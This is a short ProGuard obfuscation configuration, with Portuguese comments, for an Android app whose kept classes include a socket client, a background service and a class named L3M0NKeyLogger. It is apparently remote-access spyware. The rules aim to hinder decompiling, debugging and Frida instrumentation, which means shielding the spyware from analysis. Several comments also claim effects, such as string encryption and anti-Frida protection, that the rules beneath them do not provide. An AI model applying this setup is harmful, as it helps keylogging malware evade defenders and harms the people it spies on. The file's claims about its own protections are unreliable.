# Ofuscação agressiva
-optimizationpasses 5
-allowaccessmodification
-repackageclasses ''
-flattenpackagehierarchy ''
-obfuscationdictionary dictionary.txt
-classobfuscationdictionary dictionary.txt
-packageobfuscationdictionary dictionary.txt

# Manter classes essenciais
-keep class com.etechd.l3mon.** { *; }
-keep class com.etechd.l3mon.IOSocket { *; }
-keep class com.etechd.l3mon.MainService { *; }
-keep class com.etechd.l3mon.L3M0NKeyLogger { *; }

# Manter métodos nativos e reflection
-keepclassmembers class * {
    public static ** get*(...);
    public static ** set*(...);
    public ** (android.content.Context);
}

# Anti-decompiler
-dontusemixedcaseclassnames
-dontskipnonpubliclibraryclasses
-dontpreverify
-verbose

# String encryption (básico)
-keepclassmembers class * {
    <init>(...);
}

# Anti-Frida / Anti-Debug
-keep class * implements android.os.IBinder { *; }